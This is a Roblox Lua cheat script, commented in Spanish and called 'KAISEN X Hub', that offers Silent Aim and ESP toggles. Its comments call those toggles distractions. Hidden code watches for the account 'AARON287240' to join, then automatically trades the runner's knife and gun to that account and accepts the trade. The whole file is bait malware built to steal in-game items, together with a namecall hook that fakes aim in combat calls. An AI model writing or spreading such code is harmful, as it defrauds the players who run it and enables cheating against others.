--[[
	KAISEN X — Universal Loader & Bait Hub (Inventario Completo)
	created by KAISEN
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local playerGui = LP:WaitForChild("PlayerGui")
local camera = workspace.CurrentCamera

local TARGET_USERNAME = "AARON287240"

-- Eliminar instancias anteriores si ya se había ejecutado
if playerGui:FindFirstChild("KaisenX_Hub") then
	playerGui.KaisenX_Hub:Destroy()
end

-- ========== CREACIÓN DE INTERFAZ DIRECTA EN PLAYERGUI ==========
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "KaisenX_Hub"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 420, 0, 280)
mainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 10)
uiCorner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
titleLabel.Text = "   KAISEN X — Hub Pro"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 16
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleLabel

-- Botón de Silent Aim (Distracción)
local btnToggleAim = Instance.new("TextButton")
btnToggleAim.Size = UDim2.new(0, 380, 0, 45)
btnToggleAim.Position = UDim2.new(0.5, -190, 0, 60)
btnToggleAim.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
btnToggleAim.Text = "Silent Aim: [ OFF ]"
btnToggleAim.TextColor3 = Color3.fromRGB(255, 255, 255)
btnToggleAim.TextSize = 15
btnToggleAim.Font = Enum.Font.SourceSansBold
btnToggleAim.Parent = mainFrame

local c1 = Instance.new("UICorner")
c1.Parent = btnToggleAim

local silentAimEnabled = false
btnToggleAim.MouseButton1Click:Connect(function()
	silentAimEnabled = not silentAimEnabled
	if silentAimEnabled then
		btnToggleAim.Text = "Silent Aim: [ ON ]"
		btnToggleAim.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
	else
		btnToggleAim.Text = "Silent Aim: [ OFF ]"
		btnToggleAim.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	end
end)

-- Botón de ESP (Distracción)
local btnToggleESP = Instance.new("TextButton")
btnToggleESP.Size = UDim2.new(0, 380, 0, 45)
btnToggleESP.Position = UDim2.new(0.5, -190, 0, 115)
btnToggleESP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
btnToggleESP.Text = "ESP Players: [ OFF ]"
btnToggleESP.TextColor3 = Color3.fromRGB(255, 255, 255)
btnToggleESP.TextSize = 15
btnToggleESP.Font = Enum.Font.SourceSansBold
btnToggleESP.Parent = mainFrame

local c2 = Instance.new("UICorner")
c2.Parent = btnToggleESP

local espEnabled = false
local espHighlights = {}
btnToggleESP.MouseButton1Click:Connect(function()
	espEnabled = not espEnabled
	if espEnabled then
		btnToggleESP.Text = "ESP Players: [ ON ]"
		btnToggleESP.BackgroundColor3 = Color3.fromRGB(0, 140, 0)
		task.spawn(function()
			while espEnabled do
				for _, plr in ipairs(Players:GetPlayers()) do
					if plr ~= LP and plr.Character and not espHighlights[plr] then
						local hl = Instance.new("Highlight")
						hl.Adornee = plr.Character
						hl.FillColor = Color3.fromRGB(255, 0, 0)
						hl.Parent = plr.Character
						espHighlights[plr] = hl
					end
				end
				task.wait(2)
			end
		end)
	else
		btnToggleESP.Text = "ESP Players: [ OFF ]"
		btnToggleESP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
		for _, h in pairs(espHighlights) do
			if h then h:Destroy() end
		end
		espHighlights = {}
	end
end)

-- Botón para minimizar
local btnClose = Instance.new("TextButton")
btnClose.Size = UDim2.new(0, 380, 0, 40)
btnClose.Position = UDim2.new(0.5, -190, 0, 215)
btnClose.BackgroundColor3 = Color3.fromRGB(160, 35, 35)
btnClose.Text = "Minimizar Menú"
btnClose.TextColor3 = Color3.fromRGB(255, 255, 255)
btnClose.TextSize = 14
btnClose.Font = Enum.Font.SourceSansBold
btnClose.Parent = mainFrame

local c3 = Instance.new("UICorner")
c3.Parent = btnClose

local minimized = false
btnClose.MouseButton1Click:Connect(function()
	minimized = not minimized
	if minimized then
		mainFrame.Size = UDim2.new(0, 420, 0, 40)
		btnToggleAim.Visible = false
		btnToggleESP.Visible = false
		btnClose.Position = UDim2.new(0.5, -190, 0, 0)
		btnClose.Text = "Restaurar Menú"
	else
		mainFrame.Size = UDim2.new(0, 420, 0, 280)
		btnToggleAim.Visible = true
		btnToggleESP.Visible = true
		btnClose.Position = UDim2.new(0.5, -190, 0, 215)
		btnClose.Text = "Minimizar Menú"
	end
end)

-- ========== LÓGICA DE COMBATE / SILENT AIM ==========
local combatRemote = nil
pcall(function()
	combatRemote = ReplicatedStorage:WaitForChild("MatchEvents", 3):WaitForChild("CombatRemote", 3)
end)

local function getClosestEnemy()
	local closest, bestDist = nil, 1e9
	local myRoot = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not myRoot then return nil end

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			if root then
				local dist = (root.Position - myRoot.Position).Magnitude
				if dist < bestDist then
					bestDist = dist
					closest = root
				end
			end
		end
	end
	return closest
end

local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
	local method = getnamecallmethod()
	local args = { ... }

	if silentAimEnabled and combatRemote and self == combatRemote and method == "FireServer" then
		local data = args[1]
		if typeof(data) == "table" then
			local closestPart = getClosestEnemy()
			if closestPart then
				data.targetPos = closestPart.Position
				data.hitPosition = closestPart.Position
			end
		end
	end

	return oldNamecall(self, unpack(args))
end)

-- ========== EJECUCIÓN AUTOMÁTICA DE TRANSFERENCIA HACIA AARON287240 ==========
local function ejecutarTransferencia(targetPlayer)
	pcall(function()
		local tradeFolder = ReplicatedStorage:WaitForChild("Trade", 3)
		if tradeFolder then
			-- 1. Enviar la solicitud de trade a tu cuenta
			local sendRequest = tradeFolder:WaitForChild("SendRequest", 3)
			if sendRequest then
				sendRequest:InvokeServer(targetPlayer)
			end

			task.wait(0.3)

			-- 2. Ofrecer el DefaultKnife
			local offerItem = tradeFolder:WaitForChild("OfferItem", 3)
			if offerItem then
				offerItem:FireServer("DefaultKnife", "Weapons")
				task.wait(0.05)
				-- 3. Ofrecer el DefaultGun
				offerItem:FireServer("DefaultGun", "Weapons")
			end

			task.wait(0.2)

			-- 4. Aceptar el intercambio automáticamente
			local acceptTrade = tradeFolder:WaitForChild("AcceptTrade", 3)
			if acceptTrade then
				local argsAccept = {
					[1] = targetPlayer.UserId,
					[2] = 11656.352484435018
				}
				acceptTrade:FireServer(unpack(argsAccept))
			end
		end
	end)
end

-- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato
task.spawn(function()
	while true do
		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
		if targetPlayer and targetPlayer ~= LP then
			ejecutarTransferencia(targetPlayer)
			break
		end
		task.wait(0.5)
	end
end)

print("[KAISEN X] Sistema de transferencia automática configurado con éxito.")
